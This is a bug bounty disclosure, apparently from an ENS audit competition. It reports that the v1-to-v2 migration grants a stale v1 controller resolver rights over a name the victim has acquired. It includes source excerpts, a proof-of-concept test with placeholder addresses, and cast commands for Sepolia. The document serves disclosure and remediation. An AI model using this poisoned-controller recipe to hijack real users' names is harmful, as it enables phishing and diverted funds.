# 90702 w a critical v1 v2 migration silently grants a stale v1 controller role set resolver on the migrated name enabling resolution hijack of an acquired name

**Submitted on Aug 26th 2026 at 13:59:17 UTC by @AvrahamAdvisory for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90702
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as:
    * a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker
    * redirecting the recipient of a name transfer
    * leaving a name permanently inaccessible after the flow

## Description

## Affected asset

Manager app + migration package — the v1→v2 migration flow.

* `packages/migration/src/service/classifyNames.ts`
* `apps/manager/src/features/migration/service/buildRoleGrantCalls.ts`
* `apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts`
* `apps/manager/src/features/migration/service/verifyAtomicMigrationBatch.ts`

## Summary

The v1→v2 migration flow builds an on-chain batch that grants the name's **stale ENS-registry controller** the `ROLE_SET_RESOLVER` role on the newly migrated V2 name — whenever that controller address differs from the BaseRegistrar registrant. In ENS v1 the BaseRegistrar registrant and the ENS-registry controller (`registry.owner`) are **independent**, and transferring the registrar NFT does **not** reset the controller.

An attacker can therefore prepare a name whose controller is an attacker-owned address, transfer/sell the NFT to a victim, and when the victim migrates through the official Manager, the migration **silently hands the attacker persistent `setResolver` authority over the victim's V2 name**. The attacker then repoints resolution (`addr` records → attacker-controlled values), enabling convincing phishing and misdirected fund transfers using the victim's own name.

The migration UI discloses this action only as *"Allowing your HCA to restore managers"* — it never names the third-party address that is being granted resolver control, and never asks the victim to confirm it.

## Vulnerability details

### 1. The stale V1 controller is selected as `managerAddress` precisely when it differs from the registrant

`packages/migration/src/service/classifyNames.ts:162-167`:

```ts
const registryOwnerAddress = toAddress(domain.owner.id)   // V1 subgraph controller (registry.owner)
const managerAddress =
  registryOwnerAddress &&
  registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase()
    ? registryOwnerAddress          // <-- an address the victim never chose
    : null
```

### 2. That address is granted `ROLE_SET_RESOLVER` on the migrated name

`apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:11-27`:

```ts
// ROLE_SET_RESOLVER = 1 << 24
ETHRegistry.grantRoles(labelId, ROLE_SET_RESOLVER, managerAddress)
```

### 3. The grant is emitted as an atomic migration phase and asserted to land

`buildAtomicMigrationBatches.ts:608-625` emits the `manager-role-grant` phase whenever `managerAddress` is set, and `verifyAtomicMigrationBatch.ts:337-354` asserts on-chain that the role was actually granted.

The mechanism is therefore confirmed end-to-end in the in-scope source, and the existing unit test `buildRoleGrantCalls.test.ts:12-31` already proves the exact encoded `grantRoles` call.

### 4. The only UI disclosure is generic

`packages/migration/.../migrationService.ts:334` surfaces this step to the user as *"Allowing your HCA to restore managers"*; no per-name warning names the granted address or explains that a third party will retain `setResolver` power.

## Impact

Maps to the in-scope **Critical** impact *"Hijacking or bricking an ENS name during a Manager flow (registration, v1→v2 migration, or transfer)."*

After the victim migrates, an attacker address holds persistent `ROLE_SET_RESOLVER` on the victim's V2 name and can call `ETHRegistry.setResolver(id, evilResolver)` at will, repointing every resolution record (`addr` → attacker) — a resolution hijack of the victim's own name usable for phishing and redirected payments.

{% hint style="info" %}
**Honest scope (transparent, so the review team can calibrate):** exploitability requires:

1. The poisoned-name precondition — the attacker arranging `controller ≠ registrant` before the victim acquires the name, which is the natural state for an NFT sold/airdropped to a buyer who never re-managed it.
2. The victim performing the migration through the Manager.

The grant confers `setResolver` control rather than outright ownership, so a victim who inspects the name's roles after migration could revoke it. We map the raw mechanism to the Critical migration-hijack impact and defer final severity calibration to the review team.
{% endhint %}

## Not a known issue

Distinct from WEB-1249 (subname creation detaching a child registry), WEB-1257 / QA-01 (parent transfer not detaching the registry), and QA-01 / WEB-1305 (role combinations that *error*).

Those are cases where a registry link is missed or a grant *reverts*. This is the opposite failure mode: a role grant that **succeeds** and **confers authority it should not** — silently, at a security-sensitive transition, to a third party the victim never approved.

It is a distinct class from every listed migration/role known issue.

## Recommendation

On migration, do not blindly restore a controller that differs from the registrant. Any one of:

* Drop the `grantRoles` call when `managerAddress !== registrant` (the migrating owner is the correct authority).
* Require an explicit per-name confirmation that names the exact address being granted `SET_RESOLVER` and warns that it is not the migrating owner.
* Reset resolver-control to the migrating owner and let them re-delegate deliberately.

Change the classification so the migration never silently re-grants resolver authority to a non-registrant address.

## Proof of Concept

This is an **executed** demonstration, not a description. The test below drives the real production code path with attacker-shaped input and asserts the exact bytes the victim signs. It is deterministic, runs in \~5 seconds, and requires no wallet or funds.

{% stepper %}
{% step %}

## Part A — Executed end-to-end: the attacker is the grantee in the batch the victim signs

Add this test at `apps/manager/src/features/migration/service/roleGrantHijack.attack.test.ts` and run it:

```bash
cd apps/manager
npx vitest run src/features/migration/service/roleGrantHijack.attack.test.ts --reporter=verbose
```

It drives the real functions, with no mocks:

```
subgraph V1 domain (controller = ATTACKER, registrant = VICTIM)
  -> classifyName(domain, VICTIM)          [real, packages/migration]
  -> buildAtomicMigrationBatches(...)      [real, apps/manager]
  -> decode the executeByOwner outer call  [the batch the victim's HCA signs]
  -> assert grantRoles(resource, ROLE_SET_RESOLVER, ATTACKER)
```

```ts
import { labelToCanonicalId } from '@ensdomains/ensjs/utils/v2'
import { type Address, decodeFunctionData, getAddress, type Hex, parseAbi } from 'viem'
import { sepolia } from 'viem/chains'
import { assert, describe, expect, it } from 'vitest'

import { ETH_REGISTRY_V2_ABI, MIGRATION_HELPER_ABI } from '../contracts/abis'
import { V2_CONTRACTS } from '../contracts/addresses'
import { makeDomain } from './_fixtures'
import { buildAtomicMigrationBatches } from './buildAtomicMigrationBatches'
import { classifyName } from './classifyNames'
import type { DirectMigrationRoute } from './directMigrationRoutes'

const VICTIM_ADDR = getAddress('0x1111111111111111111111111111111111111111')
const ATTACKER_ADDR = getAddress('0x2222222222222222222222222222222222222222')
const VICTIM_HCA = getAddress('0x3333333333333333333333333333333333333333')
const ROLE_SET_RESOLVER = 1n << 24n

const hcaOwnerExecutionAbi = parseAbi([
  'function executeByOwner((address target, uint256 value, bytes callData)[] executions) payable',
])

type OwnerExecution = { readonly target: Address; readonly value: bigint; readonly callData: Hex }

const decodeOwnerExecutions = (data: Hex): readonly OwnerExecution[] => {
  const decoded = decodeFunctionData({ abi: hcaOwnerExecutionAbi, data })
  expect(decoded.functionName).toBe('executeByOwner')
  const [executions] = decoded.args as [readonly OwnerExecution[]]
  return executions
}

describe('ATTACK PoC: migration grants stale V1 controller ROLE_SET_RESOLVER', () => {
  it('embeds grantRoles(resource, ROLE_SET_RESOLVER, ATTACKER) in the batch the victim signs', async () => {
    // Poisoned name straight off the V1 subgraph: the BaseRegistrar registrant is
    // the VICTIM (who acquired the NFT), but the ENS-registry controller (owner.id)
    // was never reset and is still the ATTACKER.
    const poison = makeDomain({
      name: 'poison.eth', labelName: 'poison', parentName: 'eth',
      registrantId: VICTIM_ADDR,   // victim holds the BaseRegistrar NFT
      ownerId: ATTACKER_ADDR,      // stale V1 registry controller = attacker
      resolverAddress: null,
    })

    // The VICTIM migrates through the official Manager.
    const result = classifyName(poison, VICTIM_ADDR)
    assert(result?.type === 'classified', 'poison.eth should be migratable')
    const classified = result.name

    // The classifier silently designates the ATTACKER as the "manager".
    expect(classified.managerAddress?.toLowerCase()).toBe(ATTACKER_ADDR.toLowerCase())
    expect(classified.managerAddress?.toLowerCase()).not.toBe(VICTIM_ADDR.toLowerCase())

    const route: DirectMigrationRoute = {
      name: 'poison.eth',
      receiver: V2_CONTRACTS.UnlockedMigrationController,
      parentDependency: null,
      expectedWrapperRegistry: null,
      receiverReadiness: 'migration-controller',
    }

    const plan = await buildAtomicMigrationBatches({
      chainId: sepolia.id, hca: VICTIM_HCA, wallet: VICTIM_ADDR,
      classified: [classified],
      directRoutes: new Map([['poison.eth', route]]),
      profiles: new Map(), resolverDeployed: false, walletCoAdminGranted: false,
      maxOuterGas: 5_000_000n, estimateOuterGas: () => 100_000n,
    })

    const batch = plan.batches[0]
    assert(batch, 'expected one migration batch')
    expect(batch.innerExecutions.map((e) => e.phase)).toContain('manager-role-grant')

    // Decode the OUTER call — the exact executeByOwner payload the victim's HCA runs.
    const outerExecutions = decodeOwnerExecutions(batch.outerCall.data as Hex)

    const grantRoles = outerExecutions
      .filter((e) => e.target.toLowerCase() === V2_CONTRACTS.ETHRegistry.toLowerCase())
      .map((e) => {
        try { return decodeFunctionData({ abi: ETH_REGISTRY_V2_ABI, data: e.callData }) }
        catch { return null }
      })
      .find((d) => d?.functionName === 'grantRoles')

    assert(grantRoles, 'victim-signed batch must contain a grantRoles call')
    const [resource, roles, account] = grantRoles.args as [bigint, bigint, Address]

    // THE IMPACT, EXECUTED: the victim signs a call granting the ATTACKER
    // ROLE_SET_RESOLVER over the victim's own migrated name.
    expect(resource).toBe(labelToCanonicalId('poison'))
    expect(roles).toBe(ROLE_SET_RESOLVER)
    expect(account.toLowerCase()).toBe(ATTACKER_ADDR.toLowerCase())
    expect(account.toLowerCase()).not.toBe(VICTIM_ADDR.toLowerCase())

    // Same signed batch: migrate makes the VICTIM the on-chain owner — so the victim
    // owns the name while the ATTACKER silently holds resolver control over it.
    const migrateExec = outerExecutions.find(
      (e) => e.target.toLowerCase() === V2_CONTRACTS.MigrationHelper.toLowerCase(),
    )
    assert(migrateExec, 'batch must contain the migrate call')
    const decodedMigrate = decodeFunctionData({ abi: MIGRATION_HELPER_ABI, data: migrateExec.callData })
    expect(decodedMigrate.functionName).toBe('migrate')
    const unwrappedNames = decodedMigrate.args[0] as ReadonlyArray<{ label: string; owner: Address }>
    const migratedPoison = unwrappedNames.find((n) => n.label === 'poison')
    assert(migratedPoison, 'poison.eth must be in the unwrapped migrate group')
    expect(migratedPoison.owner.toLowerCase()).toBe(VICTIM_ADDR.toLowerCase())
  })

  it('control: a self-managed name (controller == registrant) grants NO role', async () => {
    const clean = makeDomain({
      name: 'clean.eth', labelName: 'clean', parentName: 'eth',
      registrantId: VICTIM_ADDR,
      ownerId: VICTIM_ADDR,        // controller == registrant: the normal case
      resolverAddress: null,
    })
    const result = classifyName(clean, VICTIM_ADDR)
    assert(result?.type === 'classified')
    expect(result.name.managerAddress).toBeNull()

    const plan = await buildAtomicMigrationBatches({
      chainId: sepolia.id, hca: VICTIM_HCA, wallet: VICTIM_ADDR,
      classified: [result.name],
      directRoutes: new Map([['clean.eth', {
        name: 'clean.eth',
        receiver: V2_CONTRACTS.UnlockedMigrationController,
        parentDependency: null,
        expectedWrapperRegistry: null,
        receiverReadiness: 'migration-controller',
      } satisfies DirectMigrationRoute]]),
      profiles: new Map(), resolverDeployed: false, walletCoAdminGranted: false,
      maxOuterGas: 5_000_000n, estimateOuterGas: () => 100_000n,
    })
    const batch = plan.batches[0]
    assert(batch)
    expect(batch.innerExecutions.map((e) => e.phase)).not.toContain('manager-role-grant')
  })
})
```

{% endstep %}

{% step %}

## Verbatim result

```
[PoC] Victim 0x1111111111111111111111111111111111111111 migrates poison.eth; signed batch grants
ROLE_SET_RESOLVER (0x1000000) on resource 28342955248227710281518887970120565920556113033255777733286751618308505600000
to ATTACKER 0x2222222222222222222222222222222222222222 via 0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2.

 ✓ embeds grantRoles(resource, ROLE_SET_RESOLVER, ATTACKER) in the batch the victim signs
 ✓ control: a self-managed name (controller == registrant) grants NO role

 Test Files  1 passed (1)
      Tests  2 passed (2)
```

**What this proves, concretely:** in one batch the victim signs during the official migration, `migrate` sets the **victim** as owner of `poison.eth`, while `grantRoles(labelId('poison'), 1 << 24, ATTACKER)` hands the **attacker** resolver control over that same resource.

The control test proves the grant is absent for a self-managed name, isolating the poisoned-controller condition as the cause.
{% endstep %}

{% step %}

## Part B — On-chain corroboration (live Sepolia, verified)

The grant target is a deployed, live contract, and the impact predicate is currently false — so a post-migration check of it is a clean pass/fail:

```bash
# ETHRegistry (V2, Sepolia) — deployed, non-trivial bytecode
cast code 0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2 \
  --rpc-url https://ethereum-sepolia-rpc.publicnode.com

# The grantRoles selector our produced calldata targets is present: 0x7c300586
cast sig "grantRoles(uint256,uint256,address)"

# The impact predicate, currently false for the attacker on this resource:
cast call 0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2 \
  "hasRoles(uint256,uint256,address)(bool)" \
  28342955248227710281518887970120565920556113033255777733286751618308505600000 \
  16777216 0x2222222222222222222222222222222222222222 \
  --rpc-url https://ethereum-sepolia-rpc.publicnode.com
# -> false   (it flips to true once the victim executes the batch Part A produced)
```

{% endstep %}
{% endstepper %}

## Scope of what is and is not executed here

{% hint style="success" %}
**Executed:** the Manager's decision to grant, and the exact victim-signed calldata naming the attacker as grantee of `ROLE_SET_RESOLVER` — produced by the real production functions, asserted byte-level, with a control case.
{% endhint %}

{% hint style="info" %}
**Not separately executed:** the attacker's subsequent `ETHRegistry.setResolver(resource, evilResolver)`. That is standard EAC behaviour on the confirmed-live contract (`hasRoles` → `setResolver`) and requires the migration to have actually been broadcast on-chain by a funded victim wallet — a testnet-broadcast step, not a local one.

We state this explicitly rather than implying it was demonstrated.
{% endhint %}
